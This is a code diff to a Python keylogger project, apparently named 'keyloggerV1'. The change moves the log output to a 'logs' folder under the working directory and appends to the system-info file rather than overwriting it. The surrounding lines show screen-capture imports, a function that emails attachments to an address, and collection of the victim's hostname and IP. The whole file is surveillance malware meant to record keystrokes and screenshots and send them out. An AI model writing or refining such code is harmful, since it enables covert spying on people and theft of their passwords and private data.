@@ -15,7 +15,10 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab, Image
 
-file_path = "C:\\Users\\LENOVO\\Desktop\\bitskrieg\\keyloggerV1"
+getcwd = os.getcwd()
+file_path = os.path.join(getcwd,r'logs')
+if not os.path.exists(file_path):
+    os.makedirs(file_path)
 extend = "\\"
 file_info = "key_log.txt"
 sys_info = "sysinfo.txt"
@@ -70,7 +73,7 @@ def send_email(filename, attachment, toaddress):
 
 # get computer information(IP,hostname)
 def comp_info():
-    with open(file_path+extend+sys_info,"w") as s_info:
+    with open(file_path+extend+sys_info,"a") as s_info:
         hostname = socket.gethostname()
         #get private IP address
         IPAddr = socket.gethostbyname(hostname)
